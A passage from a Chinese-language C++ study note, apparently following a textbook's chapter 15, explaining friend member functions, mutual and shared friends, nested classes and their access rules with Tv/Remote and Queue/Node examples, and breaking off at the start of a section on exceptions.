<code>Tv</code> 对象的私有成员 <code>channel</code>。</p><h3 id="15-1-2-友元成员函数"><a href="#15-1-2-友元成员函数" class="headerlink" title="15.1.2 友元成员函数"></a>15.1.2 友元成员函数</h3><p>有时，我们不需要让整个类成为友元，只需要让某个类的<strong>特定成员函数</strong>成为另一个类的友元。</p><p><strong>声明语法:</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">HostClass</span> &#123;</span></span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">    <span class="comment">// 声明 OtherClass 的 memberFunc 为友元</span></span><br><span class="line">    <span class="function"><span class="keyword">friend</span> ReturnType <span class="title">OtherClass::memberFunc</span><span class="params">(parameters)</span></span>;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p><strong>编译顺序和前向声明:</strong></p><p>声明友元成员函数时需要特别注意编译顺序和前向声明：</p><ol><li> <strong>定义提供友元成员函数的类 (OtherClass):</strong> 编译器需要先知道 <code>OtherClass</code> 的完整定义，才能处理其中的 <code>memberFunc</code>。</li><li> <strong>定义宿主类 (HostClass):</strong> 在 <code>HostClass</code> 中声明 <code>OtherClass::memberFunc</code> 为友元。</li><li> <strong>定义友元成员函数 (OtherClass::memberFunc):</strong> 这个函数的实现需要看到 <code>HostClass</code> 的完整定义，因为它需要访问 <code>HostClass</code> 的私有/保护成员。</li></ol><p>这通常需要使用**前向声明 (Forward Declaration)**。</p><p><strong>示例:</strong> 让 <code>Remote::set_chan</code> 成为 <code>Tv</code> 的友元，而不是整个 <code>Remote</code> 类。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// tvfm.h -- Tv and Remote classes using a friend member</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> TVFM_H_</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> TVFM_H_</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Tv</span>;</span> <span class="comment">// *** 1. 前向声明 Tv ***</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Remote</span> &#123;</span></span><br><span class="line">    <span class="comment">// ... (Remote 定义同前) ...</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">set_chan</span><span class="params">(Tv &amp; t, <span class="keyword">int</span> c)</span></span>; <span class="comment">// 声明 set_chan</span></span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Tv</span> &#123;</span></span><br><span class="line">    <span class="comment">// ... (Tv 定义同前) ...</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="comment">// *** 2. 将 Remote::set_chan 声明为友元 ***</span></span><br><span class="line">    <span class="function"><span class="keyword">friend</span> <span class="keyword">void</span> <span class="title">Remote::set_chan</span><span class="params">(Tv &amp; t, <span class="keyword">int</span> c)</span></span>;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// *** 3. 定义 Remote::set_chan (需要看到 Tv 的完整定义) ***</span></span><br><span class="line"><span class="function"><span class="keyword">inline</span> <span class="keyword">void</span> <span class="title">Remote::set_chan</span><span class="params">(Tv &amp; t, <span class="keyword">int</span> c)</span> </span>&#123;</span><br><span class="line">    t.channel = c; <span class="comment">// 现在可以访问 Tv 的私有成员 channel</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ... (其他 Remote 和 Tv 的内联方法定义) ...</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span> <span class="comment">// TVFM_H_</span></span></span><br></pre></td></tr></table></figure><p>在这个修改后的版本中，只有 <code>Remote::set_chan</code> 函数可以访问 <code>Tv</code> 的私有成员，而 <code>Remote</code> 的其他成员函数则不能（除非它们只调用 <code>Tv</code> 的公有方法）。这提供了比友元类更精细的访问控制。</p><h3 id="15-1-3-其他友元关系"><a href="#15-1-3-其他友元关系" class="headerlink" title="15.1.3 其他友元关系"></a>15.1.3 其他友元关系</h3><p><strong>相互友元 (Mutual Friends):</strong> 两个类可以互为友元。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ClassB</span>;</span> <span class="comment">// 前向声明</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ClassA</span> &#123;</span></span><br><span class="line">    <span class="keyword">friend</span> <span class="class"><span class="keyword">class</span> <span class="title">ClassB</span>;</span> <span class="comment">// B 是 A 的友元</span></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="keyword">int</span> dataA;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ClassB</span> &#123;</span></span><br><span class="line">    <span class="keyword">friend</span> <span class="class"><span class="keyword">class</span> <span class="title">ClassA</span>;</span> <span class="comment">// A 是 B 的友元</span></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="keyword">int</span> dataB;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">processA</span><span class="params">(ClassA&amp; a)</span> </span>&#123;</span><br><span class="line">        a.dataA = <span class="number">10</span>; <span class="comment">// B 可以访问 A 的私有成员</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ClassA 的成员函数实现需要看到 ClassB 的完整定义</span></span><br><span class="line"><span class="comment">// void ClassA::processB(ClassB&amp; b) &#123; b.dataB = 20; &#125;</span></span><br></pre></td></tr></table></figure><p><strong>将友元函数放在何处:</strong></p><ul><li>  如果友元函数只访问类的公有接口，它可以是普通非成员函数。</li><li>  如果友元函数需要访问类的私有/保护成员，它必须被声明为友元。</li><li>  如果一个函数需要访问<strong>两个不同类</strong>的私有/保护成员，那么它需要被这两个类都声明为友元。</li></ul><h3 id="15-1-4-共同的友元"><a href="#15-1-4-共同的友元" class="headerlink" title="15.1.4 共同的友元"></a>15.1.4 共同的友元</h3><p>一个函数可以是多个类的友元。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ClassC</span>;</span> <span class="comment">// 前向声明</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ClassD</span> &#123;</span></span><br><span class="line">    <span class="function"><span class="keyword">friend</span> <span class="keyword">void</span> <span class="title">sharedFriend</span><span class="params">(<span class="keyword">const</span> ClassC&amp; c, <span class="keyword">const</span> ClassD&amp; d)</span></span>;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="keyword">int</span> dataD;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ClassC</span> &#123;</span></span><br><span class="line">    <span class="function"><span class="keyword">friend</span> <span class="keyword">void</span> <span class="title">sharedFriend</span><span class="params">(<span class="keyword">const</span> ClassC&amp; c, <span class="keyword">const</span> ClassD&amp; d)</span></span>;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="keyword">int</span> dataC;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 共同友元的实现</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sharedFriend</span><span class="params">(<span class="keyword">const</span> ClassC&amp; c, <span class="keyword">const</span> ClassD&amp; d)</span> </span>&#123;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;C data: &quot;</span> &lt;&lt; c.dataC &lt;&lt; <span class="string">&quot;, D data: &quot;</span> &lt;&lt; d.dataD &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>sharedFriend</code> 函数可以同时访问 <code>ClassC</code> 和 <code>ClassD</code> 的私有成员。</p><p><strong>使用友元的时机:</strong></p><p>友元破坏了类的封装性，因为它允许外部代码直接访问内部实现细节。因此，应该<strong>谨慎使用</strong>友元。</p><ul><li><strong>何时考虑使用:</strong><ul><li>  <strong>重载运算符:</strong> 尤其是需要访问两个不同类对象内部数据（如 <code>operator&lt;&lt;</code> 输出流操作符）或左操作数不是类对象的情况。</li><li>  <strong>紧密协作的类:</strong> 当两个或多个类在概念上紧密耦合，需要高效地共享信息时（如 <code>Tv</code> 和 <code>Remote</code>）。</li><li>  <strong>底层实现:</strong> 在某些底层库或框架中，为了性能或实现特定功能可能需要友元。</li></ul></li><li>  <strong>替代方案:</strong> 在使用友元之前，考虑是否可以通过扩展类的公有接口（添加访问器或功能函数）来满足需求。</li></ul><p>友元提供了一种绕过访问控制的机制，但应作为最后的手段，而不是常规设计工具。</p><h2 id="15-2-嵌套类"><a href="#15-2-嵌套类" class="headerlink" title="15.2 嵌套类"></a>15.2 嵌套类</h2><p>C++ 允许在一个类中定义另一个类，这种在类内部定义的类称为<strong>嵌套类 (Nested Class)</strong> 或<strong>内部类 (Inner Class)**。包含嵌套类的类称为</strong>外围类 (Enclosing Class)** 或**外部类 (Outer Class)**。</p><p><strong>目的:</strong></p><p>嵌套类主要用于实现与外围类紧密相关的辅助类或数据结构，有助于将实现细节封装在外围类内部，提高代码的组织性和局部性。例如，链表或树结构的节点 (<code>Node</code>) 通常只为特定的容器类服务，将其嵌套在容器类内部就很自然。</p><p><strong>语法:</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">EnclosingClass</span> &#123;</span></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="comment">// 嵌套类可以有自己的访问控制</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">NestedClassPrivate</span> &#123;</span></span><br><span class="line">        <span class="comment">// ...</span></span><br><span class="line">    &#125;;</span><br><span class="line"><span class="keyword">protected</span>:</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">NestedClassProtected</span> &#123;</span></span><br><span class="line">        <span class="comment">// ...</span></span><br><span class="line">    &#125;;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">NestedClassPublic</span> &#123;</span></span><br><span class="line">    <span class="keyword">private</span>:</span><br><span class="line">        <span class="keyword">int</span> nestedData;</span><br><span class="line">        EnclosingClass* enclosingPtr; <span class="comment">// 可以持有外围类指针</span></span><br><span class="line">    <span class="keyword">public</span>:</span><br><span class="line">        NestedClassPublic(EnclosingClass* enc = <span class="literal">nullptr</span>) : enclosingPtr(enc) &#123;&#125;</span><br><span class="line">        <span class="function"><span class="keyword">void</span> <span class="title">accessEnclosing</span><span class="params">(EnclosingClass&amp; enc)</span></span>;</span><br><span class="line">        <span class="function"><span class="keyword">int</span> <span class="title">getData</span><span class="params">()</span> <span class="keyword">const</span> </span>&#123; <span class="keyword">return</span> nestedData; &#125;</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="keyword">int</span> enclosingData;</span><br><span class="line">    NestedClassPrivate ncp; <span class="comment">// 可以创建嵌套类对象作为成员</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    EnclosingClass(<span class="keyword">int</span> data = <span class="number">0</span>) : enclosingData(data) &#123;&#125;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">useNested</span><span class="params">(NestedClassPublic&amp; ncp)</span></span>;</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">getData</span><span class="params">()</span> <span class="keyword">const</span> </span>&#123; <span class="keyword">return</span> enclosingData; &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 嵌套类成员函数的定义</span></span><br><span class="line"><span class="keyword">void</span> EnclosingClass::NestedClassPublic::accessEnclosing(EnclosingClass&amp; enc) &#123;</span><br><span class="line">    <span class="comment">// 嵌套类可以访问外围类的所有成员 (通过对象/指针/引用)</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Accessing enclosing data: &quot;</span> &lt;&lt; enc.enclosingData &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="comment">// enc.ncp; // 可以访问外围类的私有成员对象</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 外围类成员函数的定义</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">EnclosingClass::useNested</span><span class="params">(NestedClassPublic&amp; ncp)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 外围类可以访问嵌套类的 public 成员</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Using nested data: &quot;</span> &lt;&lt; ncp.getData() &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="comment">// std::cout &lt;&lt; ncp.nestedData; // 错误！不能直接访问嵌套类的 private 成员</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="15-2-1-嵌套类和访问权限"><a href="#15-2-1-嵌套类和访问权限" class="headerlink" title="15.2.1 嵌套类和访问权限"></a>15.2.1 嵌套类和访问权限</h3><p>嵌套类的访问权限遵循以下规则：</p><ol><li><p><strong>作用域:</strong></p><ul><li>  嵌套类的名称<strong>作用域</strong>仅限于其外围类。在外部引用嵌套类时，必须使用外围类的名称和作用域解析运算符 (<code>::</code>)，例如 <code>EnclosingClass::NestedClassPublic</code>。</li><li>嵌套类的声明位置（<code>public</code>, <code>protected</code>, <code>private</code>）决定了外部代码是否以及如何能够引用该嵌套类类型本身。<ul><li>  <code>public</code>: 外部代码可以使用 <code>EnclosingClass::NestedClassPublic</code>。</li><li>  <code>protected</code>: 只有 <code>EnclosingClass</code> 及其派生类可以使用 <code>EnclosingClass::NestedClassProtected</code>。</li><li>  <code>private</code>: 只有 <code>EnclosingClass</code> 内部可以使用 <code>NestedClassPrivate</code>。</li></ul></li></ul></li><li><p><strong>嵌套类对外围类的访问:</strong></p><ul><li>  嵌套类的成员函数可以访问外围类的<strong>所有</strong>成员（<code>public</code>, <code>protected</code>, <code>private</code>），包括类型名、静态成员、枚举常量等。</li><li>  <strong>重要:</strong> 嵌套类访问外围类的非静态成员时，<strong>必须</strong>通过外围类的对象、指针或引用来进行。嵌套类对象本身<strong>不</strong>包含一个指向其外围类对象的隐式指针（不像 Java 的内部类）。</li></ul></li><li><p><strong>外围类对嵌套类的访问:</strong></p><ul><li>  外围类的成员函数可以创建嵌套类的对象。</li><li>  外围类对其嵌套类的成员的访问权限，遵循嵌套类自身的访问控制规则（<code>public</code>, <code>protected</code>, <code>private</code>）。仅仅因为一个类是嵌套的，并<strong>不</strong>意味着外围类可以无视其访问控制。外围类<strong>不能</strong>直接访问嵌套类的 <code>private</code> 成员（除非外围类是嵌套类的友元）。</li></ul></li></ol><p><strong>示例：链式队列中的 Node 嵌套类</strong></p><p>回顾第 12 章的队列模拟，<code>Queue</code> 类内部定义了一个 <code>Node</code> 结构。这就是一个典型的嵌套类（或结构）应用。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// queue.h (部分)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> QUEUE_H_</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> QUEUE_H_</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Customer</span>;</span> <span class="comment">// 前向声明</span></span><br><span class="line"><span class="keyword">typedef</span> Customer Item;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Queue</span> &#123;</span></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="comment">// 嵌套结构 Node (作用域在 Queue 内)</span></span><br><span class="line">    <span class="comment">// 设为 private，因为它是 Queue 的实现细节</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">Node</span> &#123;</span></span><br><span class="line">        Item item;</span><br><span class="line">        Node * next;</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="class"><span class="keyword">enum</span> &#123;</span> Q_SIZE = <span class="number">10</span> &#125;;</span><br><span class="line"></span><br><span class="line">    Node * front; <span class="comment">// 指向 Node 对象的指针</span></span><br><span class="line">    Node * rear;</span><br><span class="line">    <span class="keyword">int</span> items;</span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">int</span> qsize;</span><br><span class="line">    <span class="comment">// ... (禁止赋值) ...</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    Queue(<span class="keyword">int</span> qs = Q_SIZE);</span><br><span class="line">    ~Queue();</span><br><span class="line">    <span class="function"><span class="keyword">bool</span> <span class="title">isempty</span><span class="params">()</span> <span class="keyword">const</span></span>;</span><br><span class="line">    <span class="function"><span class="keyword">bool</span> <span class="title">isfull</span><span class="params">()</span> <span class="keyword">const</span></span>;</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">queuecount</span><span class="params">()</span> <span class="keyword">const</span></span>;</span><br><span class="line">    <span class="function"><span class="keyword">bool</span> <span class="title">enqueue</span><span class="params">(<span class="keyword">const</span> Item &amp;item)</span></span>; <span class="comment">// Queue 的方法可以创建和访问 Node 对象</span></span><br><span class="line">    <span class="function"><span class="keyword">bool</span> <span class="title">dequeue</span><span class="params">(Item &amp;item)</span></span>;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// queue.cpp (部分)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;queue.h&quot;</span></span></span><br><span class="line"><span class="comment">// ... Customer 定义 ...</span></span><br><span class="line"></span><br><span class="line">Queue::Queue(<span class="keyword">int</span> qs) : qsize(qs) &#123;</span><br><span class="line">    front = rear = <span class="literal">nullptr</span>;</span><br><span class="line">    items = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Queue::~Queue() &#123;</span><br><span class="line">    Node * temp; <span class="comment">// 可以声明 Node 类型的指针</span></span><br><span class="line">    <span class="keyword">while</span> (front != <span class="literal">nullptr</span>) &#123;</span><br><span class="line">        temp = front;</span><br><span class="line">        front = front-&gt;next; <span class="comment">// 可以访问 Node 的成员 (因为 Node 是 Queue 的嵌套类，且成员默认 public)</span></span><br><span class="line">        <span class="keyword">delete</span> temp;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">Queue::enqueue</span><span class="params">(<span class="keyword">const</span> Item &amp;item)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (isfull())</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    Node * add = <span class="keyword">new</span> Node; <span class="comment">// 可以创建 Node 对象</span></span><br><span class="line">    add-&gt;item = item;      <span class="comment">// 可以访问 Node 的成员</span></span><br><span class="line">    add-&gt;next = <span class="literal">nullptr</span>;</span><br><span class="line">    items++;</span><br><span class="line">    <span class="keyword">if</span> (front == <span class="literal">nullptr</span>)</span><br><span class="line">        front = add;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        rear-&gt;next = add;</span><br><span class="line">    rear = add;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// ... dequeue 实现类似 ...</span></span><br></pre></td></tr></table></figure><p>在这个例子中：</p><ul><li>  <code>Node</code> 的作用域仅限于 <code>Queue</code> 类。外部代码不能直接使用 <code>Node</code> 类型。</li><li>  <code>Queue</code> 的成员函数（如构造函数、析构函数、<code>enqueue</code>）可以自由地创建 <code>Node</code> 对象，并访问其成员 <code>item</code> 和 <code>next</code>（因为 <code>struct</code> 成员默认是 <code>public</code> 的，并且 <code>Node</code> 在 <code>Queue</code> 的作用域内）。</li></ul><h3 id="15-2-2-模板中的嵌套"><a href="#15-2-2-模板中的嵌套" class="headerlink" title="15.2.2 模板中的嵌套"></a>15.2.2 模板中的嵌套</h3><p>嵌套类也可以在类模板中定义。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> T&gt;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">OuterTemplate</span> &#123;</span></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    T outerData;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="comment">// 嵌套类</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Nested</span> &#123;</span></span><br><span class="line">    <span class="keyword">private</span>:</span><br><span class="line">        <span class="keyword">int</span> nestedData;</span><br><span class="line">    <span class="keyword">public</span>:</span><br><span class="line">        <span class="comment">// 嵌套类的成员函数可以访问外围模板类的成员</span></span><br><span class="line">        <span class="comment">// (需要通过外围类对象)</span></span><br><span class="line">        <span class="function"><span class="keyword">void</span> <span class="title">processOuter</span><span class="params">(OuterTemplate&lt;T&gt;&amp; outer)</span> </span>&#123;</span><br><span class="line">            <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Outer data: &quot;</span> &lt;&lt; outer.outerData &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">            <span class="comment">// outer.outerData = someValue; // 可以修改</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    Nested nestedObj; <span class="comment">// 外围类可以包含嵌套类对象</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    OuterTemplate(<span class="keyword">const</span> T&amp; data) : outerData(data) &#123;&#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">useNested</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        nestedObj.processOuter(*<span class="keyword">this</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 使用</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="function">OuterTemplate&lt;<span class="keyword">double</span>&gt; <span class="title">ot</span><span class="params">(<span class="number">3.14</span>)</span></span>;</span><br><span class="line">    ot.useNested(); <span class="comment">// 输出 Outer data: 3.14</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 引用嵌套类类型需要外围类模板实例化</span></span><br><span class="line">    OuterTemplate&lt;<span class="keyword">double</span>&gt;::Nested nestedInstance;</span><br><span class="line">    <span class="comment">// nestedInstance.processOuter(ot); // 也可以直接调用</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>  当外围类是模板时，嵌套类的定义通常也依赖于外围类的模板参数（如 <code>Nested</code> 可以访问 <code>outerData</code>，其类型为 <code>T</code>）。</li><li>  在外部引用嵌套类类型时，需要指定外围模板类的具体实例化类型，例如 <code>OuterTemplate&lt;double&gt;::Nested</code>。</li></ul><p><strong>总结:</strong></p><ul><li>  嵌套类是在另一个类（外围类）内部定义的类。</li><li>  嵌套类的作用域局限于外围类。</li><li>  嵌套类可以访问外围类的所有成员（通过对象、指针或引用）。</li><li>  外围类访问嵌套类成员时，受嵌套类自身访问控制的限制。</li><li>  嵌套类常用于实现与外围类紧密相关的辅助数据结构或功能，有助于封装实现细节。</li><li>  嵌套类可以出现在普通类和类模板中。</li></ul><h2 id="15-3-异常"><a href="#15-3-异常" class="headerlink" title="15.3 异常"></a>15.3 异常</h2><p>程序在运行时可能会遇到各种错误或意外情况，例如：</p><ul><li>  用户输入无效数据。</li><li>  试图打开一个不存在的文件。</li><li>  内存分配失败 (<code>new</code> 失败)。</li><li>  运算错误（如除以零）。</li></ul><p>处理这些问题对于编写健壮的程序至关重要。C++ 提供了<strong>异常处理 (Exception Handling)</strong> 